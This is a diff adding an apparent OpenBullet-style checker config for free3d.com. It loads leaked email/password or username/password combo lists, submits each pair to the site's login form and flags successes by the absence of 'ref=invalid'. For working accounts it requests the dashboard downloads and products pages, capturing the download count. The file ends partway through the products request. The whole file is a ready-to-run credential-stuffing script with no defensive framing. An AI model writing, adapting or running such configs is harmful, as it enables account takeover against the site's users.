@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Free 3D",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-17T21:09:53.9844487+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_Login REQUEST POST "https://free3d.com/" AutoRedirect=TRUE 
+  CONTENT "un=<USER>&pwd=<PASS>&lsubmit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://free3d.com/" 
+  HEADER "origin: https://free3d.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "ref=invalid" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "ref=invalid" 
+#GET_Downloads REQUEST GET "https://free3d.com/dashboard/downloads" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://free3d.com/" 
+PARSE "<SOURCE>" LR "span class=\"title\">Downloads<span class=\"light\"> :" "items</span></span>" Recursive=FALSE -> CAP "items" "" "" 
+#GET_Products REQUEST GET "https://free3d.com/dashboard/products/1/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
